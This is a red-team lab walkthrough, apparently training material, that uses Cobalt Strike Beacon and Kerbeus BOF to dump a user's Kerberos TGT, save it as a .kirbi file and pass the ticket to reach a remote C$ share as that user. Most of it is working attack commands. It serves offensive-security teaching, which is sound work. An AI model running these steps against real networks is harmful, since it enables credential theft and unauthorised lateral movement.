# User Impersonation Lab

>The objective for this lab is to dump the TGT of a user and impersonate it to access a remote resource.  

===

# Dump Ticket

1. Launch Cobalt Strike and connect to the team server.
2. Interact with the SYSTEM Beacon.
3. Attempt to list the C$ share on *lon-ws-1*.
    1. `ls \\\\lon-ws-1\\c$`

⚠️ This will fail with an ACCESS_DENIED error, because user not impersonated!  

⚠️ Prerequisite: Load BOF aggressor script for `krb_triage` and `krb_dump`  

>Open > Cobalt Strike > Script Manager > Load > `C:\Tools\Kerbeus-BOF\kerbeus_cs.cna`  

5. Triage Kerberos tickets.
    1. `krb_triage`

⚠️ You're looking for a ticket entry that looks like **rsteel @ CONTOSO.COM | krbtgt/CONTOSO.COM**.

1. Dump the ticket.

    ```beacon-nocolor
    krb_dump /user:rsteel /service:krbtgt
    ```  
2. Copy the base64 ticket.

1. Save the ticket to the attacker machine.
2. Open Powershell window on the attacker machine.  
3. Paste the above krbtgt Base64 ticket into below command and execute to save the kirbi file on attack machine.  

    ```Terminal-nocolor
    [IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\rsteel.kirbi", [Convert]::FromBase64String("[B64 TICKET]"))
    ```

===

# Pass the Ticket

1. In the Beacon interactive session, Create a new logon session, run:  

    `make_token CONTOSO\rsteel FakePass`

2. Inject the ticket into it.

    ```beacon-nocolor
    kerberos_ticket_use C:\Users\Attacker\Desktop\rsteel.kirbi
    ```
  
1. Verify that the ticket is present within the session.
    1. `run klist`

1. Attempt to access the share again.
    1. `ls \\\\lon-ws-1\\c$`

⚠️ It should work this time.

1. Drop the impersonation.
  1. `rev2self`

⚠️ In this lab, you have dumped a user's TGT from their logon session, injected it into your own sacrificial logon session, and impersonated it to access a remote resource as that user.
